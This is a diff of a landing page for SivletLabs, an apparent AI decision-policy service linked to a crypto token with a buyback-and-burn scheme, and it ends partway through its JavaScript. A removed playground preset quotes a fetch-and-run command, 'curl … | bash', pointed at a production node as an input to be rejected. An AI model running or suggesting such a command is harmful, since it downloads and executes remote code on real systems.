-              Calibrated Probabilities &amp; Strictly Proper Scoring Rules in Gymnasium MDPs
-            </h3>
+            <h3 class="font-display font-semibold text-lg text-white mb-2">Strictly Proper Scoring Rules</h3>
             <p class="text-xs text-slate-400 font-sans leading-relaxed mb-4">
-              Mathematical proof via Gibbs inequality that standard RL rewards induce overconfidence. Proves that Negative Brier and Logarithmic scoring force true posterior distribution reporting.
+              Standard RL scalar rewards lead to overconfidence. Sivlet models optimize under strictly proper scoring rules, mathematically incentivizing the policy to report its true posterior belief:
             </p>
+            <div class="p-2.5 bg-lab-950 rounded border border-lab-border font-mono text-[11px] text-slate-300">
+              $$S_{\text{Brier}}(p, y^\star) = - \sum_{k=0}^{K-1} (p_k - \mathbb{I}[k = y^\star])^2$$
+            </div>
           </div>
-          <div class="pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs font-mono">
-            <span class="text-slate-500">22 pages &middot; LaTeX</span>
-            <button onclick="openLitepaperModal()" class="text-cyan-400 hover:text-cyan-300 font-semibold hover:underline flex items-center gap-1">
-              <span>Read Manuscript</span>
-              <i data-lucide="arrow-right" class="w-3 h-3"></i>
-            </button>
+          <div class="pt-4 border-t border-lab-border mt-4 text-[11px] font-mono text-slate-500">
+            Calibrated probabilistic confidence
           </div>
         </div>
 
-        <!-- Paper 3 -->
-        <div class="lab-glass p-6 rounded-xl border border-slate-800 flex flex-col justify-between">
+        <!-- Pillar 3: Gymnasium Harness (jev-eval) -->
+        <div id="evaluation" class="lab-panel p-6 rounded-lg flex flex-col justify-between">
           <div>
-            <div class="flex items-center justify-between text-[10px] font-mono text-slate-500 mb-2">
-              <span>SIVLET-TR-2026-03</span>
-              <span class="px-1.5 py-0.5 rounded bg-slate-900 text-amber-400 border border-slate-800">PROTOCOL ECONOMICS</span>
+            <div class="w-7 h-7 rounded bg-lab-850 border border-lab-border flex items-center justify-center text-emerald-400 mb-4 font-mono text-xs">
+              03
             </div>
-            <h3 class="font-display font-bold text-base text-white mb-2 leading-snug">
-              Autonomous Agent Commerce: Zero-Key RFC 7231 Micropayments &amp; Value Sinks
-            </h3>
+            <h3 class="font-display font-semibold text-lg text-white mb-2">Gymnasium RL Harness (jev-eval)</h3>
             <p class="text-xs text-slate-400 font-sans leading-relaxed mb-4">
-              Why autonomous machine agents cannot manage SaaS credit card accounts. Implements stateless HTTP 402 gasless signatures and programmatic TWAP market buybacks.
+              Fully compliant with Farama Gymnasium APIs. Benchmarks agent decision policies across MDP simulation environments (Maze, Routing, Security, Snake) with Generalized Advantage Estimation (GAE):
             </p>
+            <div class="p-2.5 bg-lab-950 rounded border border-lab-border font-mono text-[11px] text-slate-300">
+              $$\hat{A}_t^{\text{GAE}(\gamma, \lambda)} = \sum_{l=0}^\infty (\gamma \lambda)^l \delta_{t+l}^V$$
+            </div>
           </div>
-          <div class="pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs font-mono">
-            <span class="text-slate-500">14 pages &middot; Specs</span>
-            <button onclick="openLitepaperModal()" class="text-cyan-400 hover:text-cyan-300 font-semibold hover:underline flex items-center gap-1">
-              <span>Read Manuscript</span>
-              <i data-lucide="arrow-right" class="w-3 h-3"></i>
-            </button>
+          <div class="pt-4 border-t border-lab-border mt-4 text-[11px] font-mono">
+            <a href="https://github.com/SivletLabs/jev-eval" target="_blank" class="text-emerald-400 hover:underline flex items-center gap-1">
+              <span>View jev-eval on GitHub</span>
+              <i data-lucide="arrow-up-right" class="w-3 h-3"></i>
+            </a>
           </div>
         </div>
 
@@ -816,116 +608,52 @@
   </section>
 
   <!-- ========================================================================= -->
-  <!-- 6. LIVE STATUS & PROTOCOL TELEMETRY                                       -->
+  <!-- 6. VALUE ACCRUAL: HTTP 402 TO AUTOMATED BUYBACK & BURN                    -->
   <!-- ========================================================================= -->
-  <!-- ========================================================================= -->
-  <!-- 6. LIVE STATUS & ON-CHAIN PROTOCOL TELEMETRY                         -->
-  <!-- ========================================================================= -->
-  <section id="live-status" class="py-20 relative z-10 border-t border-slate-800 bg-lab-darker">
+  <section class="py-20 border-b border-lab-border z-10">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
       
-      <div class="rounded-xl lab-glass p-6 sm:p-8 border border-cyan-500/25 relative overflow-hidden">
-        <div class="flex flex-col sm:flex-row sm:items-center justify-between pb-6 border-b border-slate-800 gap-4">
-          <div>
-            <div class="flex items-center gap-2 font-mono text-xs uppercase tracking-wider text-cyan-400 mb-1">
-              <i data-lucide="activity" class="w-4 h-4"></i> On-Chain Telemetry &middot; Robinhood Chain
-            </div>
-            <h3 class="font-display font-bold text-xl text-white">Live On-Chain Protocol &amp; Reserve Metrics</h3>
-          </div>
-          <div class="flex items-center gap-2 font-mono text-xs text-slate-400 bg-slate-900 px-3 py-1.5 rounded-lg border border-slate-800">
-            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-            <span>Robinhood Chain &middot; Mainnet (Chain ID: 4663)</span>
-          </div>
+      <div class="max-w-3xl mb-12">
+        <div class="text-xs font-mono text-emerald-400 uppercase tracking-wider mb-1">Economic Flywheel</div>
+        <h2 class="font-display font-bold text-2xl sm:text-3xl text-white">Machine-Native Micropayments &amp; Value Sink</h2>
+        <p class="text-xs sm:text-sm text-slate-400 mt-2 font-sans leading-relaxed">
+          Autonomous AI agents cannot sign credit card agreements. SivletLabs implements RFC 7231 HTTP 402 Payment Required for machine-to-machine micropayments. 100% of revenue programmatically sinks into on-chain buyback and burn.
+        </p>
+      </div>
+
+      <!-- Flowchart Steps -->
+      <div class="grid grid-cols-1 md:grid-cols-4 gap-px bg-lab-border border border-lab-border rounded-lg overflow-hidden font-mono text-xs">
+        
+        <div class="bg-lab-900 p-5">
+          <div class="text-emerald-400 font-bold mb-2">Step 01 &middot; Request</div>
+          <div class="font-semibold text-white mb-1">Agent Invocation</div>
+          <p class="text-[11px] text-slate-400 font-sans leading-normal">
+            Autonomous agent queries decision endpoint with structured observation context.
+          </p>
         </div>
 
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 pt-6">
-          
-          <!-- Card 1: Pons Bonding Pool Reserve -->
-          <div class="bg-slate-950 p-5 rounded-lg border border-slate-800 flex flex-col justify-between">
-            <div>
-              <div class="text-xs font-mono text-slate-400 uppercase tracking-wider mb-1 flex items-center justify-between">
-                <span>Pons Bonding Reserve</span>
-                <i data-lucide="layers" class="w-4 h-4 text-cyan-400"></i>
-              </div>
-              <div class="font-mono font-bold text-2xl sm:text-3xl text-emerald-400 tracking-tight" id="realCurveEthReserve">
-                1.680 ETH
-              </div>
-              <div class="mt-2 flex items-center justify-between text-[11px] font-mono text-slate-400">
-                <span>Curve Tokens:</span>
-                <span class="text-white font-semibold" id="realCurveTokens">989,000,000 SIVLET</span>
-              </div>
-            </div>
-            <div class="mt-4 pt-3 border-t border-slate-900 flex items-center justify-between text-[11px] font-mono">
-              <span class="text-slate-500">Graduation Progress</span>
-              <span class="text-emerald-400 font-bold" id="realCurveGradPct">40.0% / 4.20 ETH</span>
-            </div>
-          </div>
-
-          <!-- Card 2: Treasury Engine Balance -->
-          <div class="bg-slate-950 p-5 rounded-lg border border-slate-800 flex flex-col justify-between">
-            <div>
-              <div class="text-xs font-mono text-slate-400 uppercase tracking-wider mb-1 flex items-center justify-between">
-                <span>Treasury Balance</span>
-                <i data-lucide="shield-check" class="w-4 h-4 text-blue-400"></i>
-              </div>
-              <div class="font-mono font-bold text-2xl sm:text-3xl text-white tracking-tight" id="realTreasuryBalance">
-                0.0000 ETH
-              </div>
-              <div class="mt-2 text-[11px] font-mono text-slate-400 flex items-center justify-between">
-                <span>Auto-Trigger Threshold:</span>
-                <span class="text-cyan-300 font-semibold">50.0 USDC / 0.005 ETH</span>
-              </div>
-            </div>
-            <div class="mt-4 pt-3 border-t border-slate-900 flex items-center justify-between text-[11px] font-mono">
-              <span class="text-slate-500">Engine Contract</span>
-              <span class="text-blue-400 font-mono">0x6B50...5F8A</span>
-            </div>
-          </div>
-
-          <!-- Card 3: Total $SIVLET Burned -->
-          <div class="bg-slate-950 p-5 rounded-lg border border-amber-500/25 flex flex-col justify-between">
-            <div>
-              <div class="text-xs font-mono text-slate-400 uppercase tracking-wider mb-1 flex items-center justify-between">
-                <span>Verified Tokens Burned</span>
-                <i data-lucide="flame" class="w-4 h-4 text-amber-400"></i>
-              </div>
-              <div class="font-mono font-bold text-2xl sm:text-3xl text-amber-400 tracking-tight" id="realBurnedCount">
-                0 SIVLET
-              </div>
-              <div class="mt-2 text-[11px] font-mono text-red-300 flex items-center justify-between">
-                <span>Burn Destination:</span>
-                <span class="text-slate-400 font-mono">0x0...dead</span>
-              </div>
-            </div>
-            <div class="mt-4 pt-3 border-t border-slate-900 flex items-center justify-between text-[11px] font-mono">
-              <span class="text-slate-500">Proof of Burn Status</span>
-              <span class="text-amber-400 font-semibold" id="realBurnStatus">Awaiting 1st Buyback</span>
-            </div>
-          </div>
-
+        <div class="bg-lab-900 p-5">
+          <div class="text-emerald-400 font-bold mb-2">Step 02 &middot; Settle</div>
+          <div class="font-semibold text-white mb-1">x402 Micropayment</div>
+          <p class="text-[11px] text-slate-400 font-sans leading-normal">
+            Settled via USDC / ETH on Robinhood Chain ($0.001/call) without API key friction.
+          </p>
         </div>
 
-        <!-- On-Chain Proof Badges -->
-        <div class="mt-6 pt-4 border-t border-slate-800 flex flex-col md:flex-row items-start md:items-center justify-between text-xs font-mono text-slate-400 gap-3">
-          <div class="flex items-center flex-wrap gap-2">
-            <span class="flex items-center gap-1.5 text-emerald-400 font-semibold">
-              <i data-lucide="check-circle-2" class="w-4 h-4"></i> Verified Contracts:
-            </span>
-            <a href="https://robinhoodchain.blockscout.com/token/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="text-cyan-300 bg-slate-900 hover:bg-slate-800 px-2 py-0.5 rounded border border-slate-800 hover:underline">
-              Token: 0xb783...e2E1
-            </a>
-            <a href="https://robinhoodchain.blockscout.com/address/0x6B50f02D2292a28928bCe0F97b654E4DCbC75F8A" target="_blank" class="text-cyan-300 bg-slate-900 hover:bg-slate-800 px-2 py-0.5 rounded border border-slate-800 hover:underline">
-              Treasury: 0x6B50...5F8A
-            </a>
-            <a href="https://robinhoodchain.blockscout.com/address/0x5F02BE04d20aB66cf5Ea33ECda25194AECAd5601" target="_blank" class="text-cyan-300 bg-slate-900 hover:bg-slate-800 px-2 py-0.5 rounded border border-slate-800 hover:underline">
-              Pons Pool: 0x5F02...5601
-            </a>
-          </div>
+        <div class="bg-lab-900 p-5">
+          <div class="text-emerald-400 font-bold mb-2">Step 03 &middot; Treasury</div>
+          <div class="font-semibold text-white mb-1">Non-Custodial Inflow</div>
+          <p class="text-[11px] text-slate-400 font-sans leading-normal">
+            Revenue flows directly into the BuybackBurnEngine contract (<code class="text-slate-300">0x6B50...5F8A</code>).
+          </p>
+        </div>
 
-          <a href="https://www.ponsfamily.com/launchpad/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="text-emerald-400 hover:text-emerald-300 flex items-center gap-1 hover:underline font-semibold flex-shrink-0">
-            <span>Trade on Pons Launchpad</span>
-            <i data-lucide="external-link" class="w-3.5 h-3.5"></i>
-          </a>
+        <div class="bg-lab-900 p-5">
+          <div class="text-emerald-400 font-bold mb-2">Step 04 &middot; Burn</div>
+          <div class="font-semibold text-white mb-1">Automated Market Burn</div>
+          <p class="text-[11px] text-slate-400 font-sans leading-normal">
+            Contract buys $SIVLET on Pons bonding curve and incinerates 99% permanently to <code class="text-slate-300">0x0...dead</code>.
+          </p>
         </div>
 
       </div>
@@ -934,247 +662,210 @@
   </section>
 
   <!-- ========================================================================= -->
-  <!-- 7. LITEPAPER MODAL                                                        -->
+  <!-- 7. REPOSITORIES & DOCUMENTATION DIRECTORY                                  -->
   <!-- ========================================================================= -->
-  <div id="litepaperModal" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
-    <div class="lab-glass max-w-4xl w-full max-h-[90vh] rounded-2xl border border-slate-700 flex flex-col overflow-hidden shadow-2xl">
-      <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950">
-        <div class="flex items-center gap-2">
-          <i data-lucide="book-open" class="w-4 h-4 text-emerald-400"></i>
-          <h3 class="font-display font-bold text-white text-sm">SivletLabs Technical Litepaper (v1.0)</h3>
-        </div>
-        <button onclick="closeLitepaperModal()" class="text-slate-400 hover:text-white p-1">
-          <i data-lucide="x" class="w-5 h-5"></i>
-        </button>
+  <section class="py-20 border-b border-lab-border z-10">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      
+      <div class="text-xs font-mono text-emerald-400 uppercase tracking-wider mb-1">Open Source Ecosystem</div>
+      <h2 class="font-display font-bold text-2xl sm:text-3xl text-white mb-8">Official Repositories</h2>
+
+      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 font-mono text-xs">
+        
+        <a href="https://github.com/SivletLabs/jev-eval" target="_blank" class="lab-panel p-5 rounded-lg hover:border-slate-500 transition-colors block">
+          <div class="flex items-center justify-between mb-3 text-slate-400">
+            <i data-lucide="folder-git-2" class="w-4 h-4"></i>
+            <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i>
+          </div>
+          <div class="font-bold text-white text-sm mb-1">jev-eval</div>
+          <p class="text-[11px] font-sans text-slate-400 leading-normal">
+            Gymnasium-native RL simulation &amp; evaluation harness for discrete policy scoring.
+          </p>
+        </a>
+
+        <a href="https://github.com/SivletLabs/jev-local" target="_blank" class="lab-panel p-5 rounded-lg hover:border-slate-500 transition-colors block">
+          <div class="flex items-center justify-between mb-3 text-slate-400">
+            <i data-lucide="cpu" class="w-4 h-4"></i>
+            <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i>
+          </div>
+          <div class="font-bold text-white text-sm mb-1">jev-local</div>
+          <p class="text-[11px] font-sans text-slate-400 leading-normal">
+            Fast local Apple Silicon MLX inference kernel with prefix KV-cache rewinding.
+          </p>
+        </a>
+
+        <a href="https://github.com/SivletLabs/contracts" target="_blank" class="lab-panel p-5 rounded-lg hover:border-slate-500 transition-colors block">
+          <div class="flex items-center justify-between mb-3 text-slate-400">
+            <i data-lucide="file-code" class="w-4 h-4"></i>
+            <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i>
+          </div>
+          <div class="font-bold text-white text-sm mb-1">contracts</div>
+          <p class="text-[11px] font-sans text-slate-400 leading-normal">
+            Solidity smart contracts for the automated BuybackBurnEngine on Robinhood Chain.
+          </p>
+        </a>
+
+        <a href="https://github.com/SivletLabs/x402-gateway" target="_blank" class="lab-panel p-5 rounded-lg hover:border-slate-500 transition-colors block">
+          <div class="flex items-center justify-between mb-3 text-slate-400">
+            <i data-lucide="globe" class="w-4 h-4"></i>
+            <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i>
+          </div>
+          <div class="font-bold text-white text-sm mb-1">x402-gateway</div>
+          <p class="text-[11px] font-sans text-slate-400 leading-normal">
+            Global Cloudflare edge worker enforcing HTTP 402 payment authorization.
+          </p>
+        </a>
+
       </div>
 
-      <div class="p-6 overflow-y-auto space-y-4 text-xs font-mono text-slate-300 leading-relaxed">
-        <h4 class="text-sm font-bold text-emerald-400 uppercase">1. System-1 Decision Policies vs. Generative LLMs</h4>
-        <p>
-          Contemporary AI agent frameworks encounter acute latency bottlenecks (800ms - 2,500ms) when utilizing autoregressive language models for discrete routing and tool selection. SivletLabs decouples System-1 (fast, non-generative, calibrated policy scoring) from System-2 (deliberative chain-of-thought).
-        </p>
-
-        <h4 class="text-sm font-bold text-emerald-400 uppercase">2. Strictly Proper Scoring Rules</h4>
-        <p>
-          To prevent the catastrophic overconfidence inherent in standard Softmax token distributions, Sivlet-Decision-1 is trained and evaluated strictly against Proper Scoring Rules:
-        </p>
-        <pre class="bg-slate-950 p-3 rounded border border-slate-800 text-cyan-300">
-Negative Brier Score: S_Brier(p, y*) = - sum_{k=0}^{K-1} (p_k - I[k = y*])^2
-Logarithmic Reward:   S_log(p, y*)   = ln(p_{y*})</pre>
-
-        <h4 class="text-sm font-bold text-emerald-400 uppercase">3. Autonomous Deflationary Flywheel</h4>
-        <p>
-          100% of USDC and native ETH protocol revenue routes directly into <code>BuybackBurnEngine.sol</code> on Robinhood Chain (<code>0x6B50...5F8A</code>). Funds execute automated TWAP buybacks of $SIVLET on Pons bonding pools and Uniswap v4, incinerating 99% permanently to <code>0x000...dEaD</code>.
-        </p>
-      </div>
-
-      <div class="px-6 py-3 border-t border-slate-800 bg-slate-950 flex justify-end">
-        <button onclick="closeLitepaperModal()" class="px-4 py-1.5 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-mono font-bold">
-          Close Litepaper
-        </button>
-      </div>
     </div>
-  </div>
-
-  <!-- Raw JSON Modal -->
-  <div id="rawJsonModal" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
-    <div class="lab-glass max-w-2xl w-full rounded-2xl border border-slate-700 flex flex-col overflow-hidden shadow-2xl">
-      <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950">
-        <span class="font-mono text-xs font-bold text-white flex items-center gap-2">
-          <i data-lucide="code" class="w-4 h-4 text-cyan-400"></i> Edge Response Payload
-        </span>
-        <button onclick="toggleRawJsonModal()" class="text-slate-400 hover:text-white p-1">
-          <i data-lucide="x" class="w-4 h-4"></i>
-        </button>
-      </div>
-      <div class="p-4 bg-slate-950 max-h-[70vh] overflow-y-auto">
-        <pre id="rawJsonDisplay" class="text-xs font-mono text-emerald-300 whitespace-pre-wrap"></pre>
-      </div>
-    </div>
-  </div>
+  </section>
 
   <!-- ========================================================================= -->
   <!-- 8. FOOTER                                                                 -->
   <!-- ========================================================================= -->
-  <footer class="border-t border-slate-800 bg-lab-darker relative z-10 pt-16 pb-12">
+  <footer class="py-12 z-10 font-mono text-xs text-slate-500">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
       
-      <div class="grid grid-cols-1 md:grid-cols-4 gap-8 pb-12">
-        <div class="space-y-3">
-          <div class="flex items-center gap-2">
-            <img src="assets/logo.png" alt="SivletLabs" class="w-6 h-6 object-contain">
-            <span class="font-display font-bold text-base text-white">SivletLabs</span>
-          </div>
-          <p class="text-xs font-sans text-slate-400 leading-relaxed">
-            Institute for System-1 Decision Intelligence. Non-autoregressive inference policies &amp; Gymnasium RL evaluation.
-          </p>
+      <div class="flex flex-col md:flex-row items-start md:items-center justify-between gap-6 pb-8 border-b border-lab-border">
+        <div class="flex items-center gap-2">
+          <img src="assets/logo.png" alt="SivletLabs" class="w-5 h-5 object-contain">
+          <span class="font-display font-semibold text-sm text-white">SivletLabs</span>
+          <span class="text-slate-600">|</span>
+          <span>Institute for System-1 Decision Intelligence</span>
         </div>
 
-        <div class="space-y-3 font-mono text-xs">
-          <h4 class="font-bold text-white uppercase text-[11px] text-emerald-400">Protocol Repositories</h4>
-          <ul class="space-y-2 text-slate-400">
-            <li><a href="https://github.com/SivletLabs/contracts" target="_blank" class="hover:text-emerald-300">contracts (Treasury Engine)</a></li>
-            <li><a href="https://github.com/SivletLabs/x402-gateway" target="_blank" class="hover:text-cyan-300">x402-gateway (Edge Router)</a></li>
-            <li><a href="https://github.com/SivletLabs/jev-eval" target="_blank" class="hover:text-cyan-300">jev-eval (Gymnasium Harness)</a></li>
-            <li><a href="https://github.com/SivletLabs/jev-local" target="_blank" class="hover:text-cyan-300">jev-local (Apple Silicon MLX)</a></li>
-          </ul>
-        </div>
-
-        <div class="space-y-3 font-mono text-xs">
-          <h4 class="font-bold text-white uppercase text-[11px] text-emerald-400">On-Chain Protocol</h4>
-          <ul class="space-y-2 text-slate-400">
-            <li><a href="https://www.ponsfamily.com/launchpad/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="hover:text-emerald-300">Pons Fair Launch (Robinhood)</a></li>
-            <li><a href="https://robinhoodchain.blockscout.com/token/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="hover:text-cyan-300">Token Contract (0xb783...e2E1)</a></li>
-            <li><a href="https://robinhoodchain.blockscout.com/address/0x6B50f02D2292a28928bCe0F97b654E4DCbC75F8A" target="_blank" class="hover:text-cyan-300">Treasury Contract (0x6B50...5F8A)</a></li>
-            <li><a href="https://robinhoodchain.blockscout.com/address/0x000000000000000000000000000000000000dead" target="_blank" class="hover:text-cyan-300">Burn Black Hole (0x0...dead)</a></li>
-          </ul>
-        </div>
-
-        <div class="space-y-3 font-mono text-xs">
-          <h4 class="font-bold text-white uppercase text-[11px] text-emerald-400">Network Info</h4>
-          <ul class="space-y-1.5 text-slate-400 text-[11px]">
-            <li>Network: Robinhood Chain</li>
-            <li>Chain ID: 4663 (0x1237)</li>
-            <li>Gas Currency: Native ETH</li>
-            <li>Total Supply: 1,000,000,000</li>
-          </ul>
+        <div class="flex flex-wrap items-center gap-4 text-[11px]">
+          <a href="https://www.ponsfamily.com/launchpad/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="text-slate-400 hover:text-white transition-colors">
+            Pons Launchpad
+          </a>
+          <a href="https://robinhoodchain.blockscout.com/token/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="text-slate-400 hover:text-white transition-colors">
+            Blockscout Explorer
+          </a>
+          <a href="https://github.com/SivletLabs/jev-eval" target="_blank" class="text-slate-400 hover:text-white transition-colors">
+            GitHub
+          </a>
         </div>
       </div>
 
-      <div class="pt-8 border-t border-slate-800 flex flex-col sm:flex-row items-center justify-between text-xs font-mono text-slate-500 gap-4">
-        <div>&copy; 2026 SivletLabs. Distributed under MIT License. All rights reserved.</div>
-        <div class="flex items-center gap-2 text-slate-400 text-[11px]">
-          <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
-          <span>100% of API fees cryptographically committed to $SIVLET buy &amp; burn</span>
-        </div>
+      <div class="pt-6 flex flex-col sm:flex-row items-center justify-between gap-4 text-[11px]">
+        <div>&copy; 2026 SivletLabs. Distributed under MIT License.</div>
+        <div>Robinhood Chain &middot; Chain ID: 4663 &middot; Gas: Native ETH</div>
       </div>
 
     </div>
   </footer>
 
+  <!-- Raw JSON Modal -->
+  <div id="rawJsonModal" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
+    <div class="lab-panel max-w-2xl w-full rounded-lg border border-lab-border flex flex-col overflow-hidden shadow-2xl">
+      <div class="px-5 py-3 border-b border-lab-border flex items-center justify-between bg-lab-900 font-mono text-xs">
+        <span class="text-white font-semibold flex items-center gap-2">
+          <i data-lucide="code" class="w-4 h-4 text-emerald-400"></i> Edge Response Payload
+        </span>
+        <button onclick="toggleRawJsonModal()" class="text-slate-400 hover:text-white">
+          <i data-lucide="x" class="w-4 h-4"></i>
+        </button>
+      </div>
+      <div class="p-4 bg-lab-950 max-h-[70vh] overflow-y-auto">
+        <pre id="rawJsonDisplay" class="text-xs font-mono text-slate-300 whitespace-pre-wrap"></pre>
+      </div>
+    </div>
+  </div>
+
   <!-- ========================================================================= -->
   <!-- JAVASCRIPT CONTROLLERS                                                    -->
   <!-- ========================================================================= -->
   <script>
+    const ROBINHOOD_RPC = 'https://rpc.mainnet.chain.robinhood.com';
+    const ROBINHOOD_CHAIN_ID_HEX = '0x1237'; // 4663
+    const SIVLET_TOKEN_ADDR = '0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1';
+    const TREASURY_ADDR = '0x6B50f02D2292a28928bCe0F97b654E4DCbC75F8A';
+    const PONS_POOL_ADDR = '0x5F02BE04d20aB66cf5Ea33ECda25194AECAd5601';
+    const PONS_LAUNCHPAD_URL = 'https://www.ponsfamily.com/launchpad/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1';
+    const GRADUATION_TARGET_ETH = 4.20;
+    const REF_ETH_PRICE_USD = 2650.0;
+
+    let userAccount = null;
+    let lastPayloadResponse = null;
+
     document.addEventListener('DOMContentLoaded', () => {
       lucide.createIcons();
+      selectScenario('tool_routing');
       fetchLiveOnChainTelemetry();
       setInterval(fetchLiveOnChainTelemetry, 15000);
-      calculateSwapOutput();
-      updateCharCount();
-      
       document.getElementById('playgroundState').addEventListener('input', updateCharCount);
-      document.getElementById('playgroundOptions').addEventListener('input', updateOptionsCount);
     });
 
-    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
-    const mobileMenu = document.getElementById('mobileMenu');
-    if (mobileMenuBtn && mobileMenu) {
-      mobileMenuBtn.addEventListener('click', () => {
-        mobileMenu.classList.toggle('hidden');
-      });
-    }
-
     // -------------------------------------------------------------------------
-    // Decision Playground Scenarios
+    // Scenario Presets
     // -------------------------------------------------------------------------
     const scenarioPresets = {
       tool_routing: {
-        tag: 'PRESET: TOOL ROUTING',
-        state: 'User requested: "Find recent arXiv preprints on non-autoregressive decision models and download PDFs to local directory."',
-        options: 'web_search, bash_tool, database_query, ask_human',
-        winner: 'web_search',
-        conf: '96.0%',
-        probs: [0.96, 0.0133, 0.0133, 0.0133],
-        brier: '-0.042',
-        entropy: '0.068'
+        tag: 'TOOL ROUTING',
+        state: 'Task: Retrieve recent academic research on non-autoregressive decision policies and download preprint PDFs to local directory.',
+        options: "web_search\nbash_tool\ndatabase_query\nask_human"
       },
       maze_step: {
-        tag: 'PRESET: GYMNASIUM MAZE 8X8',
-        state: 'Agent positioned at coordinates (3, 4). Goal at (7, 7). Walls present at NORTH and WEST. EAST is clear path.',
-        options: 'UP, RIGHT, DOWN, LEFT',
-        winner: 'RIGHT',
-        conf: '98.5%',
-        probs: [0.005, 0.985, 0.005, 0.005],
-        brier: '-0.001',
-        entropy: '0.032'
+        tag: 'GYMNASIUM MAZE 8X8',
+        state: 'Gymnasium 8x8 Grid MDP: Agent at (3, 4). Target at (7, 7). Walls present at NORTH and WEST. EAST is clear path.',
+        options: "UP\nRIGHT\nDOWN\nLEFT"
       },
       security_filter: {
-        tag: 'PRESET: RISK GUARDRAIL',
-        state: 'Command proposed: "curl https://malicious.org/payload.sh | bash". Target system: Production Kubernetes Node.',
-        options: 'APPROVE, FLAG_SUSPICIOUS, REJECT',
-        winner: 'REJECT',
-        conf: '99.4%',
-        probs: [0.001, 0.005, 0.994],
-        brier: '-0.0001',
-        entropy: '0.012'
-      },
-      custom: {
-        tag: 'CUSTOM STATE & ACTIONS',
-        state: 'Enter custom decision state description...',
-        options: 'option_a, option_b, option_c',
-        winner: 'option_a',
-        conf: '85.0%',
-        probs: [0.85, 0.10, 0.05],
-        brier: '-0.055',
-        entropy: '0.120'
+        tag: 'SECURITY GATEWAY',
+        state: 'Input payload: "Evaluate user instruction for potential adversarial system prompt injection against autonomous wallet controller."',
+        options: "ALLOW_SAFE\nQUARANTINE_INSPECTION\nREJECT_ADVERSARIAL"
       }
     };
 
-    let currentPreset = 'tool_routing';
-    let lastPayloadResponse = null;
-
     function selectScenario(key) {
-      currentPreset = key;
       const preset = scenarioPresets[key];
       if (!preset) return;
-
-      document.querySelectorAll('.scenario-pill').forEach(el => {
-        el.classList.remove('bg-emerald-950/60', 'border-emerald-500/50', 'text-emerald-300');
-        el.classList.add('bg-slate-900/60', 'border-slate-800', 'text-slate-300');
-      });
-      const activePill = document.getElementById('pill-' + key);
-      if (activePill) {
-        activePill.classList.add('bg-emerald-950/60', 'border-emerald-500/50', 'text-emerald-300');
-        activePill.classList.remove('bg-slate-900/60', 'border-slate-800', 'text-slate-300');
-      }
 
       document.getElementById('presetTag').innerText = preset.tag;
       document.getElementById('playgroundState').value = preset.state;
       document.getElementById('playgroundOptions').value = preset.options;
       updateCharCount();
-      updateOptionsCount();
+
+      document.querySelectorAll('.scenario-btn').forEach(btn => {
+        btn.classList.remove('bg-lab-850', 'border-emerald-500/40', 'text-white');
+        btn.classList.add('bg-lab-900', 'border-lab-border', 'text-slate-400');
+      });
+
+      const activeBtn = document.getElementById('pill-' + key);
+      if (activeBtn) {
+        activeBtn.classList.remove('bg-lab-900', 'border-lab-border', 'text-slate-400');
+        activeBtn.classList.add('bg-lab-850', 'border-emerald-500/40', 'text-white');
+      }
     }
 
     function resetPlaygroundPreset() {
-      selectScenario(currentPreset);
+      selectScenario('tool_routing');
     }
 
     function updateCharCount() {
       const val = document.getElementById('playgroundState').value || '';
-      document.getElementById('stateCharCount').innerText = val.length + ' chars';
+      document.getElementById('stateCharCount').innerText = `${val.length} chars`;
     }
 
-    function updateOptionsCount() {
-      const raw = document.getElementById('playgroundOptions').value || '';
-      const arr = raw.split(',').map(s => s.trim()).filter(Boolean);
-      document.getElementById('optionsCount').innerText = arr.length + ' choices';
-    }
-
+    // -------------------------------------------------------------------------
+    // Playground Execution (Live Edge Gateway)
+    // -------------------------------------------------------------------------
     async function executePlaygroundInference() {
-      const btn = document.getElementById('playRunBtn');
-      const btnText = document.getElementById('playRunBtnText');
-      const state = document.getElementById('playgroundState').value;
-      const rawOptions = document.getElementById('playgroundOptions').value;
-      const options = rawOptions.split(',').map(s => s.trim()).filter(Boolean);
+      const state = document.getElementById('playgroundState').value.trim();
+      const optionsRaw = document.getElementById('playgroundOptions').value.trim();
+      const options = optionsRaw.split('\n').map(s => s.trim()).filter(Boolean);
 
-      if (options.length < 2) {
-        alert('Please specify at least 2 discrete action options.');
+      if (!state || options.length < 2) {
+        alert('Please provide an observation state and at least 2 candidate actions.');
         return;
       }
 
+      const btn = document.getElementById('playRunBtn');
+      const btnText = document.getElementById('playRunBtnText');
       btn.disabled = true;
-      btnText.innerText = 'Scoring at Edge...';
+      btnText.innerText = 'Evaluating Forward Pass...';
+
       const start = performance.now();
 
       try {
